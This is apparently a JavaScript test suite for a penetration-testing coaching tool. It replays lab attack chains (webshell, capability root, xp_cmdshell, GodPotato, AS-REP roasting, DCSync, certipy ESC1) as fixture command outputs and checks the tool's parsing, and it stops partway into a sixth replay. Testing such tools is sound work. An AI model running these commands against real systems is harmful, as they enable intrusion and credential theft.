#!/usr/bin/env node
'use strict';

/**
 * adversarial-stateful-replays-smoke.js
 *
 * End-to-end adversarial stateful replay & gate verification suite covering:
 *  1. Linux Web Upload -> Webshell -> local.txt -> Capabilities/SUID/Writable /etc -> Root -> proof.txt -> Post-Proof Loot Sweep
 *  2. Windows Workgroup SMB Guest -> web.config sa Creds -> MSSQL xp_cmdshell -> SeImpersonate (PrintSpoofer fail -> GodPotato SYSTEM)
 *  3. Active Directory Blocker Recovery (SAMR Null Denied -> fix-samr-null-denied -> AS-REP Roast -> Clock Skew -> bloodyAD -> DCSync -> Admin Auto-Upgrade -> Root Flag)
 *  4. AD CS ESC1 (certipy find benign vs vulnerable -> adcs-esc Tier 4 -> certipy auth Admin Auto-Upgrade -> Root Flag)
 *  5. Linux NFS no_root_squash + Encrypted SSH Key (ssh2john -> john without fake id_rsa user) -> bash -p (euid=0(root))
 *  6. Windows Local Privesc & Unused Facts (SeBackupPrivilege -> sebackup-serestore-abuse, cmdkey -> runas-savedcred-exec, .kdbx -> keepass-dump-recover)
 *  7. Multi-Host Pivot (10.10.10.110 Dual-Homed -> tunnel failure guard -> nmap 172.16.50.20 auto-target registration + Graph/EngMap/Chain invariants)
 *  8. Unused-Fact Moves (smbv1-vuln-verify, rpc-endpoint-abuse, crack-modular-hash, rsync.reachable) + Hero Operator Deck (getOperatorDeck) gate invariants
 */

const fs = require('fs');
const path = require('path');
const vm = require('vm');
const assert = require('assert');

const root = path.resolve(__dirname, '../..');

function createSandbox() {
  const storeMem = {};
  const sandbox = {
    console: console,
    setTimeout: setTimeout,
    clearTimeout: clearTimeout,
    Date: Date,
    Math: Math,
    Array: Array,
    Object: Object,
    String: String,
    Number: Number,
    Boolean: Boolean,
    RegExp: RegExp,
    Error: Error,
    TypeError: TypeError,
    Set: Set,
    Map: Map,
    JSON: JSON,
    Promise: Promise,
    parseInt: parseInt,
    parseFloat: parseFloat,
    isNaN: isNaN,
    isFinite: isFinite,
    encodeURIComponent: encodeURIComponent,
    decodeURIComponent: decodeURIComponent,
    window: {},
    document: {
      addEventListener: function () {},
      querySelector: function () { return null; },
      querySelectorAll: function () { return []; },
      createElement: function () {
        return {
          style: {},
          classList: { add: function () {}, remove: function () {}, toggle: function () {} },
          setAttribute: function () {},
          appendChild: function () {},
          addEventListener: function () {}
        };
      },
      getElementById: function (id) {
        if (!sandbox._elements) sandbox._elements = {};
        if (!sandbox._elements[id]) {
          sandbox._elements[id] = {
            id: id,
            innerHTML: '',
            textContent: '',
            value: '',
            style: {},
            classList: { add: function () {}, remove: function () {}, toggle: function () {} },
            setAttribute: function () {},
            addEventListener: function () {}
          };
        }
        return sandbox._elements[id];
      }
    },
    localStorage: {
      getItem: function (k) { return Object.prototype.hasOwnProperty.call(storeMem, k) ? storeMem[k] : null; },
      setItem: function (k, v) { storeMem[k] = String(v); },
      removeItem: function (k) { delete storeMem[k]; }
    },
    navigator: {},
    location: { hash: '#/path' }
  };
  sandbox.globalThis = sandbox;
  sandbox.window = sandbox;
  sandbox.root = sandbox;

  const files = [
    'assets/engine/facts.js',
    'assets/engine/loot.js',
    'assets/engine/profile.js',
    'assets/engine/vfs.js',
    'assets/engine/phases.js',
    'assets/engine/outcomes.js',
    'assets/engine/context.js',
    'assets/engine/pack.js',
    'assets/engine/packs.js',
    'data/packs-bundle.js',
    'data/field-notes.js',
    'data/decision-forks.js',
    'data/parser-signatures.js',
    'assets/engine/command.js',
    'assets/engine/workspace.js',
    'assets/engine/graph.js',
    'assets/engine/chain.js',
    'assets/engine/engmap.js',
    'assets/engine/decisionmap.js',
    'assets/engine/parsers/common.js',
    'assets/engine/parsers/nmap.js',
    'assets/engine/parsers/directory.js',
    'assets/engine/parsers/creds.js',
    'assets/engine/parsers/host.js',
    'assets/engine/parsers/services.js',
    'assets/engine/parsers/database.js',
    'assets/engine/parsers/web.js',
    'assets/engine/parsers/websource.js',
    'assets/engine/parsers/findings.js',
    'assets/engine/parsers/shape.js',
    'assets/engine/parsers/pivot.js',
    'assets/engine/parsers/dns.js',
    'assets/engine/parsers/blockers.js',
    'assets/engine/parsers/nxc-catalog.js',
    'assets/engine/parsers/inference.js',
    'assets/engine/parsers/index.js',
    'assets/engine/bloodhound.js',
    'assets/engine/resolve.js',
    'assets/ui/util.js',
    'assets/ui/icons.js',
    'assets/ui/store.js',
    'assets/ui/ctxbar.js',
    'assets/ui/ingest.js',
    'assets/ui/routes/path.js'
  ];

  for (const rel of files) {
    const code = fs.readFileSync(path.join(root, rel), 'utf8');
    vm.runInNewContext(code, sandbox, { filename: rel });
  }
  return sandbox.OBOL;
}

let passed = 0;
function check(cond, msg) {
  if (!cond) {
    console.error('FAIL:', msg);
    process.exit(1);
  }
  passed++;
}

function initEngagement(OBOL, opts) {
  const targetIp = opts.target || '10.10.10.50';
  const eng = OBOL.store._newEngagement(opts.name || 'AdversarialReplay');
  eng.params = Object.assign(eng.params || {}, {
    target: targetIp,
    lhost: opts.lhost || '10.10.14.5',
    lport: opts.lport || '4444',
    domain: opts.domain || '',
    scope_defined: true
  });
  eng.activeTarget = targetIp;
  eng.targets = [{ id: 't-1', ip: targetIp, hostname: opts.name || '', os: opts.os || '', domain: opts.domain || '' }];
  OBOL.store.active = function () { return eng; };
  OBOL.store.update = function (mutator) {
    const contextBefore = OBOL.context ? OBOL.context.beforeUpdate(eng) : null;
    mutator(eng);
    if (OBOL.context) OBOL.context.reconcile(eng, contextBefore);
  };
  OBOL.store.editTarget(targetIp, { ip: targetIp, os: opts.os || '', domain: opts.domain || '' });
  return eng;
}

// ============================================================================
// REPLAY 1: Linux Web Upload -> Webshell -> local.txt -> Capabilities/SUID/
//           Writable /etc -> Root -> proof.txt -> Post-Proof Loot Sweep
// ============================================================================
(function testReplay1LinuxWebToRoot() {
  const OBOL = createSandbox();
  initEngagement(OBOL, { name: 'LinuxWebBox', target: '10.10.10.80', os: 'Linux' });

  // Stage 1: Nmap 22 + 80
  OBOL.ingest.run({
    actionId: 'recon-nmap-quick',
    command: 'nmap -sC -sV 10.10.10.80',
    text: [
      'Nmap scan report for 10.10.10.80',
      'PORT   STATE SERVICE VERSION',
      '22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)',
      '80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))'
    ].join('\n'),
    target: '10.10.10.80'
  });
  let fs1 = OBOL.store.factSetForTarget('10.10.10.80');
  check(fs1.has('http.reachable') && fs1.has('ssh.reachable'), 'Replay 1.1: nmap mints http.reachable and ssh.reachable');

  // Stage 2: Gobuster finds /upload.php and /uploads
  OBOL.ingest.run({
    actionId: 'web-content-discovery',
    command: 'gobuster dir -u http://10.10.10.80 -w /usr/share/wordlists/dirb/common.txt',
    text: [
      '/index.php            (Status: 200) [Size: 1024]',
      '/upload.php           (Status: 200) [Size: 612]',
      '/uploads              (Status: 301) [Size: 314] [--> http://10.10.10.80/uploads/]'
    ].join('\n'),
    target: '10.10.10.80'
  });
  fs1 = OBOL.store.factSetForTarget('10.10.10.80');
  check(fs1.has('web.paths') && fs1.has('web.upload_form'), 'Replay 1.2: gobuster /upload.php mints web.paths and web.upload_form');

  // Stage 3: Upload webshell and trigger RCE
  OBOL.ingest.run({
    actionId: 'file-upload',
    command: 'curl -s http://10.10.10.80/uploads/shell.php?cmd=id',
    text: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)\n',
    target: '10.10.10.80'
  });
  fs1 = OBOL.store.factSetForTarget('10.10.10.80');
  check(fs1.has('foothold.linux'), 'Replay 1.3: file-upload id output mints foothold.linux');

  let coach = OBOL.coach.compute();
  let onFlowIds = coach.onFlow.map(a => a.id);
  check(onFlowIds.includes('flag-hunt-linux'), 'Replay 1.3: flag-hunt-linux unlocked on foothold.linux');
  check(!onFlowIds.includes('flag-hunt-root-linux'), 'Replay 1.3: flag-hunt-root-linux NOT unlocked before root access');

  // Stage 4: Capture local.txt
  OBOL.ingest.run({
    actionId: 'flag-hunt-linux',
    command: 'whoami; id; hostname; ip -4 addr | grep inet; cat /home/svc/local.txt',
    text: [
      'www-data',
      'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
      'webbox',
      '    inet 10.10.10.80/24 brd 10.10.10.255 scope global eth0',
      'a1b2c3d4e5f60718293a4b5c6d7e8f90'
    ].join('\n'),
    target: '10.10.10.80'
  });
  fs1 = OBOL.store.factSetForTarget('10.10.10.80');
  check(fs1.has('objective.local_flag') && fs1.has('proof.captured'), 'Replay 1.4: local.txt capture mints objective.local_flag and proof.captured');
  coach = OBOL.coach.compute();
  onFlowIds = coach.onFlow.map(a => a.id);
  check(!onFlowIds.includes('flag-hunt-linux'), 'Replay 1.4: flag-hunt-linux settles after local.txt captured');

  // Stage 5: Linux privesc enumeration (capabilities + SUID + writable /etc/shadow)
  OBOL.ingest.run({
    actionId: 'linux-enum-quick',
    command: 'getcap -r / 2>/dev/null; find / -perm -4000 -type f 2>/dev/null; ls -la /etc/shadow /etc/sudoers',
    text: [
      '/usr/bin/python3.10 = cap_setuid+ep',
      '/usr/bin/passwd',
      '/usr/bin/chsh',
      '/usr/bin/vim.basic',
      '-rw-rw-r-- 1 root shadow 1240 Oct 27 10:00 /etc/shadow'
    ].join('\n'),
    target: '10.10.10.80'
  });
  fs1 = OBOL.store.factSetForTarget('10.10.10.80');
  check(fs1.has('privesc.capabilities') && fs1.has('privesc.capability'), 'Replay 1.5: getcap mints privesc.capabilities and privesc.capability');
  check(fs1.has('privesc.suid') && fs1.has('privesc.suid_candidate'), 'Replay 1.5: interesting SUID vim.basic mints privesc.suid and privesc.suid_candidate');
  check(fs1.has('privesc.passwd_writable') && fs1.has('privesc.writable_etc'), 'Replay 1.5: writable /etc/shadow mints privesc.passwd_writable and privesc.writable_etc');

  coach = OBOL.coach.compute();
  onFlowIds = coach.onFlow.map(a => a.id);
  check(onFlowIds.includes('capabilities'), 'Replay 1.5: capabilities move is ready');
  check(onFlowIds.includes('suid-gtfobins'), 'Replay 1.5: suid-gtfobins move is ready');
  check(onFlowIds.includes('writable-etc-shadow-sudoers'), 'Replay 1.5: new writable-etc-shadow-sudoers move is ready');

  // Stage 6: Exploit capability to root
  OBOL.ingest.run({
    actionId: 'capabilities',
    command: '/usr/bin/python3.10 -c \'import os; os.setuid(0); os.system("id")\'',
    text: 'uid=0(root) gid=0(root) groups=0(root)\n',
    target: '10.10.10.80'
  });
  fs1 = OBOL.store.factSetForTarget('10.10.10.80');
  check(fs1.has('access.root') && fs1.has('access.admin'), 'Replay 1.6: root id output mints access.root and access.admin');
  coach = OBOL.coach.compute();
  check(coach.onFlow[0].id === 'flag-hunt-root-linux', 'Replay 1.6: flag-hunt-root-linux is #1 after access.root');
  check(!coach.onFlow.some(a => a.id === 'flag-hunt-linux'), 'Replay 1.6: flag-hunt-linux never co-occurs with flag-hunt-root-linux');

  // Stage 7: Capture /root/proof.txt -> unlocks post-proof-loot-sweep and linux-root-cred-harvest
  OBOL.ingest.run({
    actionId: 'flag-hunt-root-linux',
    command: 'whoami; id; hostname; ip -4 addr | grep inet; cat /root/proof.txt',
    text: [
      'root',
      'uid=0(root) gid=0(root) groups=0(root)',
      'webbox',
      '    inet 10.10.10.80/24 brd 10.10.10.255 scope global eth0',
      'f0e1d2c3b4a5968778695a4b3c2d1e0f'
    ].join('\n'),
    target: '10.10.10.80'
  });
  fs1 = OBOL.store.factSetForTarget('10.10.10.80');
  check(fs1.has('objective.root_flag'), 'Replay 1.7: root proof.txt mints objective.root_flag');
  coach = OBOL.coach.compute();
  onFlowIds = coach.onFlow.map(a => a.id);
  check(!onFlowIds.includes('flag-hunt-root-linux'), 'Replay 1.7: flag-hunt-root-linux settles once objective.root_flag captured');
  check(onFlowIds.includes('post-proof-loot-sweep'), 'Replay 1.7: new post-proof-loot-sweep move unlocks after flag capture');
  check(onFlowIds.includes('linux-root-cred-harvest'), 'Replay 1.7: new linux-root-cred-harvest move unlocks on access.root');
})();

// ============================================================================
// REPLAY 2: Windows Workgroup SMB Guest -> web.config sa Creds -> MSSQL
//           xp_cmdshell -> SeImpersonate (PrintSpoofer fail -> GodPotato SYSTEM)
// ============================================================================
(function testReplay2WindowsWorkgroupMssqlPotato() {
  const OBOL = createSandbox();
  initEngagement(OBOL, { name: 'SqlWorkgroupBox', target: '10.10.10.25', os: 'Windows' });

  // Stage 1: Workgroup SMB banner (name:SQLBOX) (domain:SQLBOX) must NOT mint AD facts
  OBOL.ingest.run({
    actionId: 'recon-smb-anon',
    command: "nxc smb 10.10.10.25 -u 'guest' -p '' --shares",
    text: [
      'SMB         10.10.10.25     445    SQLBOX           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SQLBOX) (domain:SQLBOX) (signing:False) (SMBv1:False)',
      'SMB         10.10.10.25     445    SQLBOX           [+] SQLBOX\\guest: ',
      'SMB         10.10.10.25     445    SQLBOX           [*] Enumerated shares',
      'SMB         10.10.10.25     445    SQLBOX           Share           Permissions     Remark',
      'SMB         10.10.10.25     445    SQLBOX           -----           -----------     ------',
      'SMB         10.10.10.25     445    SQLBOX           backups         READ            App Backups'
    ].join('\n'),
    target: '10.10.10.25'
  });
  let fs2 = OBOL.store.factSetForTarget('10.10.10.25');
  check(!fs2.has('ad.domain_known') && !fs2.has('ad.dc_candidate') && !fs2.has('ldap.reachable'), 'Replay 2.1: workgroup SMB banner (name===domain) never mints AD domain/DC facts');
  check(fs2.has('smb.shares'), 'Replay 2.1: SMB guest share enumeration mints smb.shares');

  // Stage 2: Extract sa password from web.config
  OBOL.ingest.run({
    actionId: 'smb-loot-shares',
    command: 'cat web.config',
    text: '<connectionStrings><add name="Default" connectionString="Server=10.10.10.25;Database=prod;User ID=sa;Password=SqlP@ss2026!;" /></connectionStrings>',
    target: '10.10.10.25'
  });
  fs2 = OBOL.store.factSetForTarget('10.10.10.25');
  check(fs2.has('credential.available') && fs2.has('credential.password'), 'Replay 2.2: web.config connectionString mints credential.available and credential.password');

  // Stage 3: Authenticate to MSSQL as sa -> mints mssql.authenticated + mssql.sysadmin, NOT access.admin
  OBOL.ingest.run({
    actionId: 'mssql-auth',
    command: "impacket-mssqlclient sa:'SqlP@ss2026!'@10.10.10.25",
    text: [
      '[*] Encryption required, switching to TLS',
      '[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master',
      '[*] INFO(SQLBOX): Line 1: Changed database context to \'master\'.',
      'SQL (sa  dbo@master)> SELECT IS_SRVROLEMEMBER(\'sysadmin\');',
      '1'
    ].join('\n'),
    target: '10.10.10.25'
  });
  fs2 = OBOL.store.factSetForTarget('10.10.10.25');
  check(fs2.has('mssql.authenticated') && fs2.has('mssql.sysadmin') && fs2.has('db.admin'), 'Replay 2.3: impacket-mssqlclient sa prompt mints mssql.authenticated, mssql.sysadmin, and db.admin');
  check(!fs2.has('access.admin'), 'Replay 2.3: SQL authentication alone does not falsely mint host access.admin');

  let coach = OBOL.coach.compute();
  check(coach.onFlow.slice(0, 3).some(a => a.id === 'mssql-xp-cmdshell'), 'Replay 2.3: mssql-xp-cmdshell promoted to top 3 once mssql.authenticated is held');

  // Stage 4: Execute xp_cmdshell whoami & whoami /priv -> mints foothold.windows + privesc.seimpersonate (not access.admin)
  OBOL.ingest.run({
    actionId: 'mssql-xp-cmdshell',
    command: "impacket-mssqlclient sa:'SqlP@ss2026!'@10.10.10.25 -Q \"EXEC xp_cmdshell 'whoami & whoami /priv'\"",
    text: [
      'output',
      '--------------------------------------------------------------------------------',
      'nt service\\mssqlserver',
      'PRIVILEGES INFORMATION',
      '----------------------',
      'Privilege Name                Description                               State',
      '============================= ========================================= ========',
      'SeImpersonatePrivilege        Impersonate a client after authentication Enabled',
      'SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled'
    ].join('\n'),
    target: '10.10.10.25'
  });
  fs2 = OBOL.store.factSetForTarget('10.10.10.25');
  check(fs2.has('foothold.windows') && fs2.has('privesc.windows_privilege'), 'Replay 2.4: xp_cmdshell whoami /priv mints foothold.windows and privesc.windows_privilege');
  check(!fs2.has('access.admin'), 'Replay 2.4: xp_cmdshell as nt service\\mssqlserver does not mint access.admin');

  // Stage 5: Failed PrintSpoofer attempt -> mints blocker.potato, not access.system
  OBOL.ingest.run({
    actionId: 'seimpersonate',
    command: 'C:\\Temp\\PrintSpoofer.exe -i -c "cmd /c whoami"',
    text: '[+] Found privilege: SeImpersonatePrivilege\n[-] CreateProcessAsUser() failed: 1314\n',
    target: '10.10.10.25'
  });
  fs2 = OBOL.store.factSetForTarget('10.10.10.25');
  check(fs2.has('blocker.potato') && !fs2.has('access.system'), 'Replay 2.5: failed PrintSpoofer mints blocker.potato and not access.system');

  // Stage 6: Successful GodPotato -> clears blocker.potato, mints access.system, unlocks flag-hunt-root-windows
  OBOL.ingest.run({
    actionId: 'seimpersonate',
    command: 'C:\\Temp\\GodPotato.exe -cmd "cmd /c whoami"',
    text: '[*] CombaseModule: 0x14070\n[+] CreateProcessWithTokenW OK\nnt authority\\system\n',
    target: '10.10.10.25'
  });
  fs2 = OBOL.store.factSetForTarget('10.10.10.25');
  check(fs2.has('access.system'), 'Replay 2.6: GodPotato nt authority\\system mints access.system');
  check(!fs2.has('blocker.potato'), 'Replay 2.6: successful GodPotato clears blocker.potato');

  coach = OBOL.coach.compute();
  check(coach.onFlow[0].id === 'flag-hunt-root-windows', 'Replay 2.6: flag-hunt-root-windows is #1 after access.system');
  check(coach.onFlow.findIndex(a => a.id === 'flag-hunt-windows') > 0, 'Replay 2.6: uncaptured flag-hunt-windows stays open behind flag-hunt-root-windows');
})();

// ============================================================================
// REPLAY 3: Active Directory Blocker Recovery (SAMR Null Denied ->
//           fix-samr-null-denied -> AS-REP Roast -> Clock Skew -> DCSync ->
//           Admin Auto-Upgrade -> flag-hunt-root-windows)
// ============================================================================
(function testReplay3ADBlockerRecoveryAndAdminUpgrade() {
  const OBOL = createSandbox();
  initEngagement(OBOL, { name: 'ADCorpDC', target: '10.10.10.161', os: 'Windows', domain: 'htb.local' });

  // Stage 1: Anonymous SAMR user enumeration fails with STATUS_ACCESS_DENIED -> mints blocker.samr_null_denied
  OBOL.ingest.run({
    actionId: 'recon-smb-anon',
    command: "nxc smb 10.10.10.161 -u '' -p '' --users",
    text: [
      'SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:False)',
      'SMB         10.10.10.161    445    FOREST           [+] htb.local\\: ',
      'SMB         10.10.10.161    445    FOREST           [-] Error enumerating domain users using dc ip 10.10.10.161: SESSION_ERROR: STATUS_ACCESS_DENIED(Access Denied)'
    ].join('\n'),
    target: '10.10.10.161'
  });
  let fs3 = OBOL.store.factSetForTarget('10.10.10.161');
  check(fs3.has('blocker.samr_null_denied'), 'Replay 3.1: nxc --users STATUS_ACCESS_DENIED mints blocker.samr_null_denied');
  check(!fs3.has('blocker.smb_null_denied'), 'Replay 3.1: nxc --users with [+] htb.local\\: does not falsely mint blocker.smb_null_denied');

  const ranked3 = OBOL.pack.rankActions(fs3, OBOL.packs.actions());
  check(ranked3.some(a => a.id === 'fix-samr-null-denied'), 'Replay 3.1: new fix-samr-null-denied move unlocked in rankActions on blocker.samr_null_denied');
  check(Boolean(OBOL.FIELD_DOCTORS && OBOL.FIELD_DOCTORS['blocker.samr_null_denied']), 'Replay 3.1: blocker.samr_null_denied has a reactive canvas doctor in OBOL.FIELD_DOCTORS');

  // Stage 2: Guest RID brute recovers domain users -> clears blocker.samr_null_denied and settles fix-samr-null-denied
  OBOL.ingest.run({
    actionId: 'fix-samr-null-denied',
    command: "nxc smb 10.10.10.161 -u 'guest' -p '' --rid-brute",
    text: [
      'SMB         10.10.10.161    445    FOREST           [+] htb.local\\guest: ',
      'SMB         10.10.10.161    445    FOREST           500: HTB\\Administrator (SidTypeUser)',
      'SMB         10.10.10.161    445    FOREST           1145: HTB\\svc-alfresco (SidTypeUser)'
    ].join('\n'),
    target: '10.10.10.161'
  });
  fs3 = OBOL.store.factSetForTarget('10.10.10.161');
  check(fs3.has('ad.user_list') && !fs3.has('blocker.samr_null_denied'), 'Replay 3.2: RID brute mints ad.user_list and clears blocker.samr_null_denied');

  // Stage 3: AS-REP Roast + Crack svc-alfresco
  OBOL.ingest.run({
    actionId: 'asrep-roast',
    command: 'impacket-GetNPUsers htb.local/ -dc-ip 10.10.10.161 -usersfile users.txt -format hashcat',
    text: '$krb5asrep$23$svc-alfresco@HTB.LOCAL:9522e56de829d2c37fb3b2fb0d2fb720$0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f20\n',
    target: '10.10.10.161'
  });
  OBOL.ingest.run({
    actionId: 'crack-asrep',
    command: 'hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt',
    text: '$krb5asrep$23$svc-alfresco@HTB.LOCAL:9522e56de829d2c37fb3b2fb0d2fb720$0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f20:s3rvice\n',
    target: '10.10.10.161'
  });
  fs3 = OBOL.store.factSetForTarget('10.10.10.161');
  check(fs3.has('credential.available') && fs3.has('credential.password'), 'Replay 3.3: cracked AS-REP hash mints credential.available and credential.password');

  // Stage 4: DCSync dumps Administrator NT hash -> ranks Administrator #1 in credentialNotice & unlocks flag-hunt-root-windows upon selection
  OBOL.ingest.run({
    actionId: 'dcsync',
    command: "impacket-secretsdump 'htb.local/svc-alfresco:s3rvice'@10.10.10.161 -just-dc-ntlm",
    text: [
      '[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)',
      'Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::',
      'krbtgt:502:aad3b435b51404eeaad3b435b51404ee:816a183b4e0c888f000d9260a906b95b:::'
    ].join('\n'),
    target: '10.10.10.161'
  });
  const eng3 = OBOL.store.active();
  const adminCred = OBOL.context.credentials(eng3).find(c => /administrator/i.test(c.user));
  check(adminCred && eng3.ui && eng3.ui.credentialNotice && eng3.ui.credentialNotice.ids[0] === adminCred.id, 'Replay 3.4: DCSync prioritizes Administrator #1 in credentialNotice');
  OBOL.store.selectCredential(adminCred.id, '10.10.10.161');
  const ctx3 = OBOL.store.resolvedContext({ target: '10.10.10.161' });
  check(ctx3.credential && /administrator/i.test(ctx3.credential.user), 'Replay 3.4: selectedCredByHost resolves to Administrator');

  const coach = OBOL.coach.compute();
  check(coach.onFlow[0].id === 'flag-hunt-root-windows', 'Replay 3.4: flag-hunt-root-windows is #1 after DCSync');
  const filledCmd0 = OBOL.command.fillCommand(coach.onFlow[0], OBOL.store.factSetForTarget('10.10.10.161'), { params: OBOL.store.active().params, target: '10.10.10.161' }, 0);
  check(filledCmd0.filled.includes('32693b11e6aa90eb43d32c72a07ceea6') && !filledCmd0.filled.includes('aad3b435b51404ee:'), 'Replay 3.4: root flag locate command fills clean NT hash without LM prefix');
})();

// ============================================================================
// REPLAY 4: AD CS ESC1 (Benign certipy find vs Vulnerable ESC1 -> adcs-esc
//           Tier 4 -> certipy auth Administrator Auto-Upgrade)
// ============================================================================
(function testReplay4AdcsEsc1Flow() {
  const OBOL = createSandbox();
  initEngagement(OBOL, { name: 'ADCSBox', target: '10.10.10.190', os: 'Windows', domain: 'corp.local' });
  OBOL.store.addFacts([
    OBOL.facts.makeFact({ kind: 'ad.domain_known', scope: 'domain:corp.local', value: { name: 'corp.local' } }),
    OBOL.facts.makeFact({ kind: 'credential.available', scope: 'domain:corp.local', value: { user: 'john', password: 'Pass123!', domain: 'corp.local' } })
  ], 'test', '10.10.10.190');

  // Stage 1: Benign certipy find ("Found no vulnerable certificate templates")
  OBOL.ingest.run({
    actionId: 'adcs-enum',
    command: "certipy find -u 'john@corp.local' -p 'Pass123!' -dc-ip 10.10.10.190 -vulnerable -stdout",
    text: [
      'Certipy v4.8.2 - by Oliver Lyak (ly4k)',
      '[*] Finding certificate templates',
      '[*] Found 33 certificate templates',
      '[!] Found no vulnerable certificate templates'
    ].join('\n'),
    target: '10.10.10.190'
  });
  let fs4 = OBOL.store.factSetForTarget('10.10.10.190');
  check(!fs4.has('adcs.vulnerable') && !fs4.has('adcs.esc1'), 'Replay 4.1: benign certipy find ("Found no vulnerable") does not mint adcs.vulnerable');

  // Stage 2: Vulnerable certipy find (ESC1)
  OBOL.ingest.run({
    actionId: 'adcs-enum',
    command: "certipy find -u 'john@corp.local' -p 'Pass123!' -dc-ip 10.10.10.190 -vulnerable -stdout",
    text: [
      'Certificate Authorities',
      '  0',
      '    CA Name                             : CORP-DC01-CA',
      'Certificate Templates',
      '  0',
      '    Template Name                       : CorpUserSubCA',
      '    Enrollee Supplies Subject           : True',
      '    Client Authentication               : True',
      '    [!] Vulnerable Certificates Templates :',
      '    ESC1                                : \'CORP.LOCAL\\\\Domain Users\' can enroll and template allows subjectAltName'
    ].join('\n'),
    target: '10.10.10.190'
  });
  fs4 = OBOL.store.factSetForTarget('10.10.10.190');
  check(fs4.has('adcs.vulnerable') && fs4.values('adcs.vulnerable').some(v => v && Array.isArray(v.esc) && v.esc.includes('ESC1')), 'Replay 4.2: ESC1 certipy output mints adcs.vulnerable with ESC1');

  let coach = OBOL.coach.compute();
  check(coach.onFlow.slice(0, 3).some(a => a.id === 'adcs-esc'), 'Replay 4.2: adcs-esc is promoted to top 3 once adcs.vulnerable is proven');

  // Stage 3: certipy auth -pfx administrator.pfx recovers Administrator NT hash + access.admin
  OBOL.ingest.run({
    actionId: 'adcs-esc',
    command: 'certipy auth -pfx administrator.pfx -dc-ip 10.10.10.190',
    text: [
      'Certipy v4.8.2 - by Oliver Lyak (ly4k)',
      '[*] Using principal: administrator@corp.local',
      '[*] Trying to get TGT...',
      '[*] Got TGT',
      '[*] Saved credential cache to \'administrator.ccache\'',
      '[*] Trying to retrieve NT hash for \'administrator\'',
      '[*] Got hash for \'administrator@corp.local\': aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c'
    ].join('\n'),
    target: '10.10.10.190'
  });
  fs4 = OBOL.store.factSetForTarget('10.10.10.190');
  check(fs4.has('access.admin'), 'Replay 4.3: certipy auth for administrator@corp.local mints access.admin');
  coach = OBOL.coach.compute();
  check(coach.onFlow[0].id === 'flag-hunt-root-windows', 'Replay 4.3: flag-hunt-root-windows is #1 after certipy auth as administrator');
})();

// ============================================================================
// REPLAY 5: Linux NFS no_root_squash + Encrypted SSH Key (john without fake
//           id_rsa user) + bash -p (euid=0(root))
// ============================================================================
(function testReplay5LinuxNfsEncryptedKeyEuidRoot() {
  const OBOL = createSandbox();
  initEngagement(OBOL, { name: 'LinuxNfsBox', target: '10.10.10.95', os: 'Linux' });

  // Stage 1: Remote showmount -e must NOT mint foothold.linux
  OBOL.ingest.run({
    actionId: 'recon-nfs',
    command: 'showmount -e 10.10.10.95',
    text: [
      'Export list for 10.10.10.95:',
      '/var/nfs *',
      '/home/dev (rw,no_root_squash)'
    ].join('\n'),
    target: '10.10.10.95'
  });
  let fs5 = OBOL.store.factSetForTarget('10.10.10.95');
  check(fs5.has('nfs.reachable') && !fs5.has('foothold.linux'), 'Replay 5.1: remote showmount -e mints nfs.reachable without prematurely minting foothold.linux');

  // Stage 2: Encrypted SSH private key -> mints hash.crackable + hash.candidate
  OBOL.ingest.run({
    actionId: 'nfs-enum',
    command: 'cat /mnt/dev/.ssh/id_rsa',
    text: [
      '-----BEGIN RSA PRIVATE KEY-----',
      'Proc-Type: 4,ENCRYPTED',
      'DEK-Info: AES-128-CBC,1A2B3C4D5E6F0102030405060708090A',
      '',
      'MIIEpAIBAAKCAQEA0123456789abcdef',
      '-----END RSA PRIVATE KEY-----'
    ].join('\n'),
    target: '10.10.10.95'
  });
  fs5 = OBOL.store.factSetForTarget('10.10.10.95');
  check(fs5.has('hash.crackable') && fs5.has('hash.candidate'), 'Replay 5.2: encrypted RSA key mints hash.crackable and hash.candidate');

  // Stage 3: john cracks id_rsa passphrase -> mints credential.ssh_key_passphrase and NOT fake user "id_rsa"
  OBOL.ingest.run({
    actionId: 'crack-ssh-key',
    command: 'john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash',
    text: [
      'Using default input encoding: UTF-8',
      'Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])',
      'supersecret      (id_rsa)',
      '1g 0:00:00:01 DONE (2026-10-27 10:00) 1.000g/s'
    ].join('\n'),
    target: '10.10.10.95'
  });
  fs5 = OBOL.store.factSetForTarget('10.10.10.95');
  check(fs5.has('credential.password') && fs5.has('credential.plaintext'), 'Replay 5.3: john (id_rsa) mints credential.password and credential.plaintext');
  const fakeUser = fs5.values('credential.available').some(v => v && /^id_rsa$/i.test(String(v.user || '')));
  check(!fakeUser, 'Replay 5.3: john (id_rsa) does NOT mint fake user "id_rsa" in credential.available');

  // Stage 4: SUID /bin/bash -p produces euid=0(root) and docker group
  OBOL.ingest.run({
    actionId: 'suid-gtfobins',
    command: '/bin/bash -p -c id',
    text: 'uid=1000(dev) gid=1000(dev) euid=0(root) egid=0(root) groups=1000(dev),999(docker)\n',
    target: '10.10.10.95'
  });
  fs5 = OBOL.store.factSetForTarget('10.10.10.95');
  check(fs5.has('access.root') && fs5.has('access.admin') && fs5.has('privesc.docker_group'), 'Replay 5.4: /bin/bash -p euid=0(root) groups=999(docker) mints access.root, access.admin, and privesc.docker_group');
})();

// ============================================================================
// REPLAY 6: Windows Local Privesc & Unused Facts (SeBackupPrivilege ->
//           sebackup-serestore-abuse, cmdkey -> runas-savedcred-exec,
//           .kdbx -> keepass-dump-recover)
// ============================================================================
(function testReplay6WindowsLocalPrivescAndUnusedFacts() {
  const OBOL = createSandbox();
